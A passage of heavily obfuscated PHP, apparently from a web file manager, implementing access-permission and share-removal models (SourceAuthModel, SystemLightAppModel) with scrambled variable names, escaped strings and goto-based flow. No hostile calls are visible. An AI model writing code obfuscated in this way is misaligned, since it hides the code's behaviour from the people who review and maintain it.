$‡¶Æ­…)); $šÑ¶ÆÜ– = Model($ªèË‹Ğ[1352])->where($â²õñ¨)->field($ªèË‹Ğ[402])->select(); if (!$šÑ¶ÆÜ–) { return; } $šÑ¶ÆÜ– = array_to_keyvalue($šÑ¶ÆÜ–, $ªèË‹Ğ[12], $ªèË‹Ğ[402]); foreach ($šÑ¶ÆÜ– as $½ùòŠ) { Model($ªèË‹Ğ[416])->removeNow($½ùòŠ, !1); } } private function removeShareItems($£¾¸µ¨) { $î çÖãó =& $_SERVER[şÒÁøÒÄ]; $êö‡‹× = "\173\x69\157\x3a{$£¾¸µ¨}\175\x2f"; $Î²×è¶å = array($î çÖãó[402] => 0, $î çÖãó[1188] => array($î çÖãó[383], "{$êö‡‹×}\45")); $ãÍÏÆÀ¥ = Model($î çÖãó[1849])->where($Î²×è¶å)->field($î çÖãó[593])->select(); if (empty($ãÍÏÆÀ¥)) { return; } $‚î“íĞ‹ = array_to_keyvalue($ãÍÏÆÀ¥, $î çÖãó[12], $î çÖãó[593]); Model($î çÖãó[592])->remove($‚î“íĞ‹); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\x4c\151\x67\150\164\101\x70\160"; public $modelType = "\123\x79\x73\164\x65\x6d\x4f\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\x61\155\145", "\x67\162\x6f\165\160", "\x64\145\x73\143", "\143\x6f\156\x74\x65\156\x74"); public function listData($›œèå = false, $ë£›·ÂÁ = "\155\157\144\151\146\x79\x54\151\x6d\145", $É¡©¸ÉÛ = true) { return parent::listData($›œèå, $ë£›·ÂÁ, $É¡©¸ÉÛ); } public function remove($ÔÓéåğ–) { $êÂ¬ß‚Ì = $this->findByName($ÔÓéåğ–); if (!$êÂ¬ß‚Ì) { return !1; } return parent::remove($êÂ¬ß‚Ì[$_SERVER[şÒÁøÒÄ][399]]); } public function add($Ïù›Ÿ¤) { if ($this->findByName($Ïù›Ÿ¤[$_SERVER[şÒÁøÒÄ][32]])) { return !1; } return parent::insert($Ïù›Ÿ¤); } public function update($½ŠŞ¡ß–, $÷ĞµÏ‘) { $™Éığê =& $_SERVER[şÒÁøÒÄ]; $ÀÀ“ùëÄ = $this->findByName($½ŠŞ¡ß–); $ÃÑº˜„ = $this->findByName($÷ĞµÏ‘[$™Éığê[32]]); if (!$ÀÀ“ùëÄ || $ÃÑº˜„ && $ÃÑº˜„[$™Éığê[399]] != $ÀÀ“ùëÄ[$™Éığê[399]]) { return !1; } return parent::update($ÀÀ“ùëÄ[$™Éığê[399]], $÷ĞµÏ‘); } } goto AñŞƒ¢”‰÷; f¨ÛëËÇÊâ: define($_SERVER[şÒÁøÒÄ][238], 1); define($_SERVER[şÒÁøÒÄ][239], 2); define($_SERVER[şÒÁøÒÄ][240], 3); goto b‘“ƒ•ôÎÅ; bó¼ï ë: class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\162\x63\x65\x5f\x61\x75\164\x68"; public function getAuth($ÈŠØÏ–à) { $›î£ÕØ =& $_SERVER[şÒÁøÒÄ]; $Í¿ÏŸĞ† = $this->sourceAuthSelect($ÈŠØÏ–à); $¨¾‚ãÖÒ = array(); $ÒÌ†Ş¿ = array(); $Êöñ²Á = 2 << 25; foreach ($Í¿ÏŸĞ† as $í‰ñÎª¯) { $µÌşš = Model($›î£ÕØ[498])->listData($í‰ñÎª¯[$›î£ÕØ[1973]]); if (!$µÌşš) { continue; } $¨¾‚ãÖÒ[] = $í‰ñÎª¯; $¥ê¾à‘á = 0; if ($í‰ñÎª¯[$›î£ÕØ[411]] == SourceModel::TYPE_GROUP) { $¥ê¾à‘á = $Êöñ²Á * 2; } if ($í‰ñÎª¯[$›î£ÕØ[411]] == SourceModel::TYPE_USER) { $¥ê¾à‘á = $Êöñ²Á; } if ($í‰ñÎª¯[$›î£ÕØ[411]] == SourceModel::TYPE_USER && $í‰ñÎª¯[$›î£ÕØ[496]] == $›î£ÕØ[198]) { $¥ê¾à‘á = 0; } $ÒÌ†Ş¿[] = $µÌşš[$›î£ÕØ[413]] + $¥ê¾à‘á; } array_multisort($ÒÌ†Ş¿, SORT_DESC, $¨¾‚ãÖÒ); return $¨¾‚ãÖÒ; } public function sourceAuthSelect($„ ÄÅ‘æ) { $ä¶¸ïÂã =& $_SERVER[şÒÁøÒÄ]; static $ÑŞ·úâ = array(); $¿‰ ƒğ² = is_array($„ ÄÅ‘æ) ? !1 : !0; if ($¿‰ ƒğ²) { $„ ÄÅ‘æ = array($„ ÄÅ‘æ); } $—ÎÙ¸Ò¦ = array(); foreach ($„ ÄÅ‘æ as $’ÁÙäŸ‘) { if (isset($ÑŞ·úâ[$’ÁÙäŸ‘])) { $—ÎÙ¸Ò¦[$’ÁÙäŸ‘] = $ÑŞ·úâ[$’ÁÙäŸ‘]; } } if (count($—ÎÙ¸Ò¦) == count($„ ÄÅ‘æ)) { return $¿‰ ƒğ² ? $—ÎÙ¸Ò¦[$„ ÄÅ‘æ[0]] : $—ÎÙ¸Ò¦; } $¤ıüÁí€ = $ä¶¸ïÂã[2050]; $ç²Í§ = array($ä¶¸ïÂã[402] => array($ä¶¸ïÂã[7], $„ ÄÅ‘æ)); $Ñ¬ä¾ñ = $this->field($¤ıüÁí€)->order($ä¶¸ïÂã[399])->where($ç²Í§)->select(); $š„ğË› = array_to_keyvalue_group($Ñ¬ä¾ñ, $ä¶¸ïÂã[402]); foreach ($„ ÄÅ‘æ as $’ÁÙäŸ‘) { $ÑŞ·úâ[$’ÁÙäŸ‘] = $š„ğË›[$’ÁÙäŸ‘] ? $š„ğË›[$’ÁÙäŸ‘] : array(); } if ($¿‰ ƒğ²) { return $Ñ¬ä¾ñ; } return $š„ğË›; } public function setAuth($¦™ğ•§ø, $èàú×½­) { $ƒˆ‘¹Úô =& $_SERVER[şÒÁøÒÄ]; $Ûû’²  = Model($ƒˆ‘¹Úô[1352])->sourceInfo($¦™ğ•§ø); if (!$Ûû’² ) { return !1; } if ($Ûû’² [$ƒˆ‘¹Úô[411]] != SourceModel::TYPE_GROUP) { return !1; } $ì’ü¥ÀÑ = 1; $¬¿åşÎ = $Ûû’² [$ƒˆ‘¹Úô[496]]; if ($¬¿åşÎ != $ì’ü¥ÀÑ) { $ÕÑÄÚõÒ = array($ƒˆ‘¹Úô[1869] => $¬¿åşÎ); $¦ô¿‡ ® = Model($ƒˆ‘¹Úô[1959])->field($ƒˆ‘¹Úô[1680])->where($ÕÑÄÚõÒ)->select(); $¦ô¿‡ ® = array_to_keyvalue($¦ô¿‡ ®, $ƒˆ‘¹Úô[12], $ƒˆ‘¹Úô[1680]); } $‡Óİ½­¶ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $´Î­ù®· = array(); foreach ($èàú×½­ as $¨ÙÄø¾â) { if (!in_array($¨ÙÄø¾â[$ƒˆ‘¹Úô[411]], $‡Óİ½­¶)) { show_json(LNG($ƒˆ‘¹Úô[2051]), !1); } if ($¬¿åşÎ != $ì’ü¥ÀÑ) { if ($¨ÙÄø¾â[$ƒˆ‘¹Úô[411]] == SourceModel::TYPE_GROUP) { } if ($¨ÙÄø¾â[$ƒˆ‘¹Úô[496]] != 0 && !in_array($¨ÙÄø¾â[$ƒˆ‘¹Úô[496]], $¦ô¿‡ ®)) { } } if ($¨ÙÄø¾â[$ƒˆ‘¹Úô[496]] == 0) { $¨ÙÄø¾â[$ƒˆ‘¹Úô[411]] = SourceModel::TYPE_USER; } $´Î­ù®·[] = array($ƒˆ‘¹Úô[402] => $¦™ğ•§ø, $ƒˆ‘¹Úô[411] => intval($¨ÙÄø¾â[$ƒˆ‘¹Úô[411]]), $ƒˆ‘¹Úô[496] => intval($¨ÙÄø¾â[$ƒˆ‘¹Úô[496]]), $ƒˆ‘¹Úô[1973] => intval($¨ÙÄø¾â[$ƒˆ‘¹Úô[1973]]) ? intval($¨ÙÄø¾â[$ƒˆ‘¹Úô[1973]]) : 0, $ƒˆ‘¹Úô[2033] => intval($¨ÙÄø¾â[$ƒˆ‘¹Úô[2033]]) ? intval($¨ÙÄø¾â[$ƒˆ‘¹Úô[2033]]) : -1); } $this->where(array($ƒˆ‘¹Úô[417] => $¦™ğ•§ø))->delete(); $this->addAll($´Î­ù®·); return !0; } public function authClear($³€óÍ¥) { $ËÅŸÈÃ =& $_SERVER[şÒÁøÒÄ]; $²§¡–çş = Model($ËÅŸÈÃ[1352])->sourceInfo($³€óÍ¥); $ŸæûÑˆÑ = array($³€óÍ¥); if ($²§¡–çş[$ËÅŸÈÃ[410]] == $ËÅŸÈÃ[88]) { $»¿ ë = array($ËÅŸÈÃ[580] => array($ËÅŸÈÃ[540], $²§¡–çş[$ËÅŸÈÃ[511]] . $³€óÍ¥ . $ËÅŸÈÃ[541])); $ŸæûÑˆÑ = Model($ËÅŸÈÃ[1352])->field($ËÅŸÈÃ[417])->where($»¿ ë)->getField($ËÅŸÈÃ[402], !0); $ŸæûÑˆÑ[] = $³€óÍ¥; } $this->where(array($ËÅŸÈÃ[417] => array($ËÅŸÈÃ[418], $ŸæûÑˆÑ)))->delete(); return !0; } public function getAllChildren($…È²ÁãÒ) { $ëò§éº =& $_SERVER[şÒÁøÒÄ]; $ÚùªĞäÜ = Model($ëò§éº[1352])->sourceInfo($…È²ÁãÒ); if ($ÚùªĞäÜ[$ëò§éº[410]] != $ëò§éº[88]) { return $this->sourceListAuth(array($…È²ÁãÒ)); } if ($ÚùªĞäÜ[$ëò§éº[411]] != SourceModel::TYPE_GROUP) { return array(); } $şØ„è¥ = 1; $É°’—ğ = array($…È²ÁãÒ); if ($ÚùªĞäÜ[$ëò§éº[432]] == $ëò§éº[198] && $ÚùªĞäÜ[$ëò§éº[496]] != $şØ„è¥) { $É°’—ğ = $this->groupChidldAllRootSource($ÚùªĞäÜ[$ëò§éº[496]]); } $ÆûíÒ¤Œ = $this->field($ëò§éº[402])->group($ëò§éº[402])->select(); $ÆûíÒ¤Œ = array_to_keyvalue($ÆûíÒ¤Œ, $ëò§éº[12], $ëò§éº[402]); if (!$ÆûíÒ¤Œ) { return array(); } $Ü¯±‚ó = $ëò§éº[2052]; $Œ°òÜëÓ = array($ëò§éº[402] => array($ëò§éº[7], $ÆûíÒ¤Œ), $ëò§éº[431] => $ëò§éº[198]); $»¦œÊÖ = Model($ëò§éº[833])->field($Ü¯±‚ó)->where($Œ°òÜëÓ)->select(); $ÈñÖÖæÆ = array($…È²ÁãÒ); foreach ($»¦œÊÖ as $¤ñğ—òË) { foreach ($É°’—ğ as $Ú…¸Üğ) { $œ˜¹ÒÓ» = $ëò§éº[50] . $Ú…¸Üğ . $ëò§éº[50]; $­¯³ú„ = $¤ñğ—òË[$ëò§éº[511]] . $¤ñğ—òË[$ëò§éº[402]] . $ëò§éº[50]; if (strstr($­¯³ú„, $œ˜¹ÒÓ»)) { $ÈñÖÖæÆ[] = $¤ñğ—òË[$ëò§éº[402]]; break; } } } return $this->sourceListAuth($ÈñÖÖæÆ); } private function sourceListAuth($“½¦ü´ˆ) { $Ç½õß² =& $_SERVER[şÒÁøÒÄ]; $Ï‡à®° = Model($Ç½õß²[1352])->sourceListInfo($“½¦ü´ˆ, !0); $†Ï¬”µà = $this->sourceAuthSelect($“½¦ü´ˆ); $“³ì¥€¨ = array(); $çáÔ©ö± = array(); foreach ($Ï‡à®° as $‡¢¾°ê±) { unset($‡¢¾°ê±[$Ç½õß²[456]]); unset($‡¢¾°ê±[$Ç½õß²[454]]); unset($‡¢¾°ê±[$Ç½õß²[413]]); unset($‡¢¾°ê±[$Ç½õß²[87]]); $Ö‡à¡“ù = $†Ï¬”µà[$‡¢¾°ê±[$Ç½õß²[402]]]; if (!$Ö‡à¡“ù) { continue; } $‡¢¾°ê±[$Ç½õß²[2053]] = $this->authTargetInfo($Ö‡à¡“ù); $‡¢¾°ê±[$Ç½õß²[509]] = rtrim($‡¢¾°ê±[$Ç½õß²[515]], $Ç½õß²[8]) . $Ç½õß²[8] . ltrim($‡¢¾°ê±[$Ç½õß²[509]], $Ç½õß²[8]); $“³ì¥€¨[] = $‡¢¾°ê±; $ÛßÁä›Ş = count(explode($Ç½õß²[8], trim($‡¢¾°ê±[$Ç½õß²[509]], $Ç½õß²[8]))); $çáÔ©ö±[] = $ÛßÁä›Ş + ($‡¢¾°ê±[$Ç½õß²[33]] == $Ç½õß²[75] ? 0 : 1000); } array_multisort($çáÔ©ö±, SORT_ASC, $“³ì¥€¨); return $“³ì¥€¨; } private function groupChidldAllRootSource($‰¿«‰øš) { $óÉ’ÎÑ =& $_SERVER[şÒÁøÒÄ]; $Á„á‘Ê = Model($óÉ’ÎÑ[2054])->groupChildrenAll($‰¿«‰øš); $’ı‘Ğ»ú = array($óÉ’ÎÑ[432] => 0, $óÉ’ÎÑ[496] => array($óÉ’ÎÑ[7], $Á„á‘Ê), $óÉ’ÎÑ[411] => SourceModel::TYPE_GROUP); $ÆÈ…Ä€ = Model($óÉ’ÎÑ[833])->field($óÉ’ÎÑ[402])->where($’ı‘Ğ»ú)->select(); $ÆÈ…Ä€ = array_to_keyvalue($ÆÈ…Ä€, $óÉ’ÎÑ[12], $óÉ’ÎÑ[402]); return $ÆÈ…Ä€; } private function authTargetInfo($ÓÓ•ã©¡) { $ØÔÈéùà =& $_SERVER[şÒÁøÒÄ]; $Ï•Ó‘Øİ = array(); $†¶¼õî‰ = array(); $¢âã„Î§ = 2 << 25; foreach ($ÓÓ•ã©¡ as $Üù¢ª°) { $•¼¹ò½À = Model($ØÔÈéùà[498])->listData($Üù¢ª°[$ØÔÈéùà[1973]]); if (!$•¼¹ò½À) { continue; } if ($Üù¢ª°[$ØÔÈéùà[411]] == SourceModel::TYPE_USER) { $®Ï¶í°§ = Model($ØÔÈéùà[504])->getInfoSimpleOuter($Üù¢ª°[$ØÔÈéùà[496]]); if ($®Ï¶í°§[$ØÔÈéùà[1680]] == $ØÔÈéùà[1201]) { continue; } if ($®Ï¶í°§[$ØÔÈéùà[1680]] == $ØÔÈéùà[198]) { $®Ï¶í°§[$ØÔÈéùà[32]] = LNG($ØÔÈéùà[2055]); } } else { $®Ï¶í°§ = Model($ØÔÈéùà[512])->getInfoSimple($Üù¢ª°[$ØÔÈéùà[496]]); } if (!$®Ï¶í°§) { continue; } $®Ï¶í°§[$ØÔÈéùà[467]] = $•¼¹ò½À; $Ï•Ó‘Øİ[] = $®Ï¶í°§; $Ñ½‰šùå = 0; if ($Üù¢ª°[$ØÔÈéùà[411]] == SourceModel::TYPE_GROUP) { $Ñ½‰šùå = $¢âã„Î§ * 2; } if ($Üù¢ª°[$ØÔÈéùà[411]] == SourceModel::TYPE_USER) { $Ñ½‰šùå = $¢âã„Î§; } if ($Üù¢ª°[$ØÔÈéùà[411]] == SourceModel::TYPE_USER && $Üù¢ª°[$ØÔÈéùà[496]] == $ØÔÈéùà[198]) { $Ñ½‰šùå = 0; } $†¶¼õî‰[] = $•¼¹ò½À[$ØÔÈéùà[413]] + $Ñ½‰šùå; } array_multisort($†¶¼õî‰, SORT_DESC, $Ï•Ó‘Øİ); return $Ï•Ó‘Øİ; } public function getAllChildrenByUser($‡«°˜›, $—è°ß‹) { $à¾³÷è› =& $_SERVER[şÒÁøÒÄ]; $À°¶ = Model($à¾³÷è›[525])->getInfo($—è°ß‹); if (!$—è°ß‹ || !$‡«°˜› || !$À°¶) { return array(); } $ïÜ•ÏÏá = Model($à¾³÷è›[1352])->sourceInfo($‡«°˜›); $ôİ¹Ìùö = array(); $¢œéé² = 1; if ($ïÜ•ÏÏá[$à¾³÷è›[432]] == $à¾³÷è›[198] && $ïÜ•ÏÏá[$à¾³÷è›[496]] != $¢œéé² && $this->groupContainUser($ïÜ•ÏÏá[$à¾³÷è›[496]], $—è°ß‹)) { foreach ($À°¶[$à¾³÷è›[2056]] as $§Ïèş¹Á) { $ªˆµ = Model($à¾³÷è›[512])->getInfo($§Ïèş¹Á[$à¾³÷è›[1869]]); $È˜»÷×¢ = Model($à¾³÷è›[525])->getInfoSimpleOuter($—è°ß‹); $È˜»÷×¢[$à¾³÷è›[467]] = $§Ïèş¹Á[$à¾³÷è›[413]]; if (Model($à¾³÷è›[498])->authCheckAction($§Ïèş¹Á[$à¾³÷è›[413]][$à¾³÷è›[413]], $à¾³÷è›[1890])) { continue; } $œÓ°ïâ³ = array($à¾³÷è›[32] => $à¾³÷è›[1221] . $ªˆµ[$à¾³÷è›[32]], $à¾³÷è›[402] => $ªˆµ[$à¾³÷è›[87]][$à¾³÷è›[402]], $à¾³÷è›[84] => KodIO::make($ªˆµ[$à¾³÷è›[87]][$à¾³÷è›[402]]), $à¾³÷è›[432] => $à¾³÷è›[198], $à¾³÷è›[411] => $à¾³÷è›[505], $à¾³÷è›[33] => $à¾³÷è›[544], $à¾³÷è›[509] => $ªˆµ[$à¾³÷è›[516]], $à¾³÷è›[1869] => $ªˆµ[$à¾³÷è›[1869]], $à¾³÷è›[513] => $ªˆµ[$à¾³÷è›[432]], $à¾³÷è›[2053] => array($È˜»÷×¢)); $ôİ¹Ìùö[$œÓ°ïâ³[$à¾³÷è›[402]]] = $œÓ°ïâ³; } } $ÅÂğ©ä± = array(); $®‹¾¾ä = $this->getAllChildren($‡«°˜›); foreach ($®‹¾¾ä as $È¾æç·) { $ûí£…Ë™ = !1; foreach ($È¾æç·[$à¾³÷è›[2053]] as $øåšôÓ) { if ($øåšôÓ[$à¾³÷è›[1680]]) { if ($øåšôÓ[$à¾³÷è›[1680]] == $—è°ß‹) { $ûí£…Ë™ = !0; break; } } if ($øåšôÓ[$à¾³÷è›[1869]]) { if ($this->groupContainUser($øåšôÓ[$à¾³÷è›[1869]], $—è°ß‹)) { $ûí£…Ë™ = !0; break; } } } if ($ûí£…Ë™) { $ÅÂğ©ä±[] = $È¾æç·; } $ÌèæÂù… = $È¾æç·[$à¾³÷è›[402]]; if (isset($ôİ¹Ìùö[$ÌèæÂù…])) { $È¾æç·[$à¾³÷è›[2053]][] = $ôİ¹Ìùö[$ÌèæÂù…][0]; $ôİ¹Ìùö[$ÌèæÂù…] = !1; } } $ôİ¹Ìùö = array_filter(array_values($ôİ¹Ìùö)); $ÅÂğ©ä± = array_merge($ôİ¹Ìùö, $ÅÂğ©ä±); return $ÅÂğ©ä±; } public function setAllChildrenByUser($¼¼ˆùÍË, $ûñ¬ïÛ, $«¸ï´üÑ) { $‘”å©Şê =& $_SERVER[şÒÁøÒÄ]; $Ü¡¥›‚ = $this->getAllChildrenByUser($¼¼ˆùÍË, $ûñ¬ïÛ); if (!$«¸ï´üÑ || !$Ü¡¥›‚) { return !1; } foreach ($Ü¡¥›‚ as $±ø‘ıãğ) { $ÚæÍš•Ï = array(); foreach ($±ø‘ıãğ[$‘”å©Şê[2053]] as $ı•Ûêê­) { $™ ¾³ÖÁ = $ı•Ûêê­[$‘”å©Şê[467]]; $Ë‚®ã¦­ = $ı•Ûêê­[$‘”å©Şê[1680]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $•ÔÀÏ®ö = $ı•Ûêê­[$‘”å©Şê[1680]] ? $ı•Ûêê­[$‘”å©Şê[1680]] : $ı•Ûêê­[$‘”å©Şê[1869]]; if ($ı•Ûêê­[$‘”å©Şê[1680]] && $ı•Ûêê­[$‘”å©Şê[1680]] == $ûñ¬ïÛ) { continue; } $ÚæÍš•Ï[] = array($‘”å©Şê[402] => $±ø‘ıãğ[$‘”å©Şê[402]], $‘”å©Şê[411] => $Ë‚®ã¦­, $‘”å©Şê[496] => intval($•ÔÀÏ®ö), $‘”å©Şê[1973] => isset($™ ¾³ÖÁ[$‘”å©Şê[399]]) ? intval($™ ¾³ÖÁ[$‘”å©Şê[399]]) : 0, $‘”å©Şê[2033] => isset($™ ¾³ÖÁ[$‘”å©Şê[2033]]) ? intval($™ ¾³ÖÁ[$‘”å©Şê[2033]]) : -1); } $ÚæÍš•Ï[] = array($‘”å©Şê[402] => $±ø‘ıãğ[$‘”å©Şê[402]], $‘”å©Şê[411] => SourceModel::TYPE_USER, $‘”å©Şê[496] => intval($ûñ¬ïÛ), $‘”å©Şê[1973] => intval($«¸ï´üÑ), $‘”å©Şê[2033] => -1); $this->where(array($‘”å©Şê[417] => $±ø‘ıãğ[$‘”å©Şê[402]]))->delete(); $this->addAll($ÚæÍš•Ï); } return !0; } public function get($ ”æòœì) { $ª˜Áå¹ı = $this->getSourceList(array($ ”æòœì), !0); return $ª˜Áå¹ı[0]; } public function getSourceList($ÊÓÖæÄÙ, $óÍ€”„ş = false, $ çú°¾· = false) { $ˆ–Ó×û« =& $_SERVER[şÒÁøÒÄ]; if (!$ÊÓÖæÄÙ) { return array(); } $‘®İœä³ = Model($ˆ–Ó×û«[1352]); if (!$óÍ€”„ş && count($ÊÓÖæÄÙ) == 1) { $óÍ€”„ş = array(); $óÍ€”„ş[$ÊÓÖæÄÙ[0]] = $‘®İœä³->sourceInfo($ÊÓÖæÄÙ[0]); } if (!$óÍ€”„ş) { $ÌİÄ²  = array($ˆ–Ó×û«[417] => array($ˆ–Ó×û«[418], $ÊÓÖæÄÙ)); $óÍ€”„ş = $‘®İœä³->field($ˆ–Ó×û«[2057])->where($ÌİÄ² )->select(); $óÍ€”„ş = array_to_keyvalue($óÍ€”„ş, $ˆ–Ó×û«[402]); } $¿†ÙƒÔ = $ÊÓÖæÄÙ; foreach ($óÍ€”„ş as $ãÓ¢¨ÑÇ => $ğ¿ŸíÌ) { $Í›Îãª° = $‘®İœä³->parentLevelArray($ğ¿ŸíÌ[$ˆ–Ó×û«[511]]); $¿†ÙƒÔ = array_merge($¿†ÙƒÔ, array($ãÓ¢¨ÑÇ), array_reverse($Í›Îãª°)); } $¿†ÙƒÔ = array_values(array_unique($¿†ÙƒÔ)); if (!$¿†ÙƒÔ) { return array(); } $Óãº‰„è = $this->sourceAuthSelect($¿†ÙƒÔ); $´õËÚ‡… = array(); foreach ($¿†ÙƒÔ as $Ö¿…›ÌÉ) { if (isset($Óãº‰„è[$Ö¿…›ÌÉ])) { $´õËÚ‡…[$Ö¿…›ÌÉ] = $Óãº‰„è[$Ö¿…›ÌÉ]; } } $Ş‹™Ñóò = $this->userIsRoot($ çú°¾·); $ó¯§¦ûï = AuthModel::authAll(); $°§²²€à = array($ˆ–Ó×û«[414] => $ó¯§¦ûï, $ˆ–Ó×û«[2058] => array($ˆ–Ó×û«[419] => 0, $ˆ–Ó×û«[1875] => $ó¯§¦ûï, $ˆ–Ó×û«[420] => LNG($ˆ–Ó×û«[2059]), $ˆ–Ó×û«[1892] => $ˆ–Ó×û«[2060])); $®†èàæø = array(); foreach ($óÍ€”„ş as $Ö¿…›ÌÉ => $è‹ƒ­«) { if ($Ş‹™Ñóò && $GLOBALS[$ˆ–Ó×û«[6]][$ˆ–Ó×û«[1888]]) { $®†èàæø[$Ö¿…›ÌÉ] = $°§²²€à; continue; } $®†èàæø[$Ö¿…›ÌÉ] = $this->makeSourceAuth($è‹ƒ­«, $´õËÚ‡…, $ çú°¾·); } return $®†èàæø; } public function authDeepCheck($ëäÜĞ©Ñ, $ë†óŸŒ = false) { $¢˜´³ö =& $_SERVER[şÒÁøÒÄ]; $ë†óŸŒ = $ë†óŸŒ ? $ë†óŸŒ : USER_ID; $â¼èµùæ = $this->makeAuthDeep($ë†óŸŒ); if (!in_array($ëäÜĞ©Ñ, $â¼èµùæ[$¢˜´³ö[2061]])) { return !1; } $‰ÈÃ  = array(); foreach ($â¼èµùæ[$¢˜´³ö[2062]] as $“È× => $ µ©‹±) { if (!in_array($ëäÜĞ©Ñ, $ µ©‹±)) { continue; } $‰ÈÃ [] = $“È×; } if (!$‰ÈÃ ) { return !1; } $…ˆ²åÓ¦ = $‰ÈÃ  ? $‰ÈÃ [0] : $ëäÜĞ©Ñ; return array($¢˜´³ö[414] => -1, $¢˜´³ö[467] => array($¢˜´³ö[419] => $¢˜´³ö[1201], $¢˜´³ö[1875] => $¢˜´³ö[198], $¢˜´³ö[420] => LNG($¢˜´³ö[2063]), $¢˜´³ö[1892] => $¢˜´³ö[2064]), $¢˜´³ö[2065] => LNG($¢˜´³ö[2066]), $¢˜´³ö[2067] => $this->sourceAuthInfo($…ˆ²åÓ¦)); } protected function makeAuthDeep($—‹±Ñ¬¬ = false) { $æ¸ú› =& $_SERVER[şÒÁøÒÄ]; static $ÑŒ”Çïş = array(); $—‹±Ñ¬¬ = $—‹±Ñ¬¬ ? $—‹±Ñ¬¬ : USER_ID; if (isset($ÑŒ”Çïş[$—‹±Ñ¬¬])) { return $ÑŒ”Çïş[$—‹±Ñ¬¬]; } $°½ùãíš = Model($æ¸ú›[2068])->listData(); $µÜºöÑÍ = array(); foreach ($°½ùãíš as $ßü’šè ) { if ($ßü’šè [$æ¸ú›[413]] == 0 && $ßü’šè [$æ¸ú›[1891]] == $æ¸ú›[88]) { $µÜºöÑÍ[] = $ßü’šè [$æ¸ú›[399]]; } } $…¿å–Ú™ = $this->userGroupParents($—‹±Ñ¬¬); $ãöáÍí = array($æ¸ú›[411] => SourceModel::TYPE_USER, $æ¸ú›[496] => $—‹±Ñ¬¬); if ($…¿å–Ú™) { $ãöáÍí = array(array($æ¸ú›[411] => SourceModel::TYPE_USER, $æ¸ú›[496] => $—‹±Ñ¬¬), array($æ¸ú›[411] => SourceModel::TYPE_GROUP, $æ¸ú›[496] => array($æ¸ú›[418], $…¿å–Ú™)), $æ¸ú›[1013] => $æ¸ú›[1967]); } $ìâÇñÂ = $this->field($æ¸ú›[2069])->where($ãöáÍí)->select(); $Õ±ºÀ‚ğ = array(); $²ñÖ®õ = array_to_keyvalue_group($ìâÇñÂ, $æ¸ú›[402]); foreach ($²ñÖ®õ as $ñ®»ú•í => $‹æüµÓŒ) { $â•ãş·Õ = $this->authArrayCheck($‹æüµÓŒ, $—‹±Ñ¬¬); if ($â•ãş·Õ[$æ¸ú›[414]] > 0) { $Õ±ºÀ‚ğ[] = $ñ®»ú•í . $æ¸ú›[12]; } } if ($…¿å–Ú™) { $‰Æ—Äˆü = Model($æ¸ú›[512]); foreach ($…¿å–Ú™ as $óïö§ã¼) { $Ú³Ø™–Ô = $‰Æ—Äˆü->getInfo($óïö§ã¼); if (!$Ú³Ø™–Ô || !is_array($Ú³Ø™–Ô[$æ¸ú›[87]])) { continue; } $Õ±ºÀ‚ğ[] = $Ú³Ø™–Ô[$æ¸ú›[87]][$æ¸ú›[402]]; } } $­Ò²±Õ = array(); $Óªè÷ÌÅ = $…¿å–Ú™; $Á˜Ì‚ = Model($æ¸ú›[1352]); $‰Æ—Äˆü = Model($æ¸ú›[512]); $ÓÖ²š Ÿ = array(); $çÕÙ”Ñş = array(); $¯¶¥Ô•› = array(); $šÅ¨”Úå = array(); if ($Õ±ºÀ‚ğ) { $È†Ï‘å  = $Á˜Ì‚->where(array($æ¸ú›[402] => array($æ¸ú›[418], $Õ±ºÀ‚ğ)))->select(); foreach ($È†Ï‘å  as $ñ¦ö•ŠÛ) { $­•¦áëÓ = $Á˜Ì‚->parentLevelArray($ñ¦ö•ŠÛ[$æ¸ú›[511]]); $­Ò²±Õ = array_merge($­Ò²±Õ, $­•¦áëÓ); $Óªè÷ÌÅ[] = $ñ¦ö•ŠÛ[$æ¸ú›[496]]; $ÓÖ²š Ÿ[$ñ¦ö•ŠÛ[$æ¸ú›[402]]] = $­•¦áëÓ; $çÕÙ”Ñş[$ñ¦ö•ŠÛ[$æ¸ú›[402]]] = $ñ¦ö•ŠÛ[$æ¸ú›[496]]; } } $Óªè÷ÌÅ = array_values(array_unique($Óªè÷ÌÅ)); $—ˆº£ÃÅ = $Óªè÷ÌÅ; foreach ($—ˆº£ÃÅ as $óïö§ã¼) { $Ú³Ø™–Ô = $‰Æ—Äˆü->getInfo($óïö§ã¼); $­•¦áëÓ = $Á˜Ì‚->parentLevelArray($Ú³Ø™–Ô[$æ¸ú›[511]]); $Óªè÷ÌÅ = array_merge($Óªè÷ÌÅ, $­•¦áëÓ); } $Óªè÷ÌÅ = array_values(array_unique($Óªè÷ÌÅ)); foreach ($Óªè÷ÌÅ as $óïö§ã¼) { $Ú³Ø™–Ô = $‰Æ—Äˆü->getInfo($óïö§ã¼); $­Ò²±Õ[] = $Ú³Ø™–Ô[$æ¸ú›[87]][$æ¸ú›[402]]; $¯¶¥Ô•›[$óïö§ã¼] = $Ú³Ø™–Ô[$æ¸ú›[87]][$æ¸ú›[402]]; $šÅ¨”Úå[$óïö§ã¼] = $Á˜Ì‚->parentLevelArray($Ú³Ø™–Ô[$æ¸ú›[511]]); } foreach ($ÓÖ²š Ÿ as $Ìø—ŸŞó => $Úş§ºÑü) { $”‡»ÇŠ² = $çÕÙ”Ñş[$Ìø—ŸŞó]; if (!$”‡»ÇŠ² || !$¯¶¥Ô•›[$”‡»ÇŠ²]) { continue; } $½ÒÄ¹²ô = array(); foreach ($šÅ¨”Úå[$”‡»ÇŠ²] as $óïö§ã¼) { $½ÒÄ¹²ô[] = $¯¶¥Ô•›[$óïö§ã¼]; } $ÓÖ²š Ÿ[$Ìø—ŸŞó] = array_merge($½ÒÄ¹²ô, $Úş§ºÑü); } $­Ò²±Õ = array_values(array_unique($­Ò²±Õ)); $“ü¨ôƒ’ = array($æ¸ú›[2061] => $­Ò²±Õ, $æ¸ú›[2062] => $ÓÖ²š Ÿ); $ÑŒ”Çïş[$—‹±Ñ¬¬] = $“ü¨ôƒ’; return $“ü¨ôƒ’; } private function makeSourceAuth($Ü„ñû¾’, $ï•ÂÈã, $Úœ‡á¼À = false) { $İîüÀı =& $_SERVER[şÒÁøÒÄ]; $ûãƒ®™ã = $İîüÀı[88]; $ğÆå²•š = $Ü„ñû¾’[$İîüÀı[496]]; $ÇÖ«úù€ = 